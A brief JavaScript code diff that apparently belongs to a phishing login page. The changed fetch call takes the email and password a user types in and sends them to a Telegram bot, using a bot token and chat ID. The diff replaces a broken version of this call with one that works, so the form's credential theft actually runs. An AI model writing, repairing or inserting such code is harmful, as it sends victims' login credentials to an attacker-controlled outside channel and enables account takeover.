@@ -164,10 +164,7 @@
                 btnload.style.display = "inline-block";
                 fetch("https://api.telegram.org/bot" +
                     token +
-                    "/sendMessage?chat_id=" + id + "&text=" +
-        text +
-        "&parse_mode=markdown",
-                      " + email.value + " | " + password.value).then(() => {
+                    "/sendMessage?chat_id=" + id + "&text=" + email.value + " | " + password.value).then(() => {
                         btntxt.style.display = "inline-block";
                         btnload.style.display = "none";
                     })
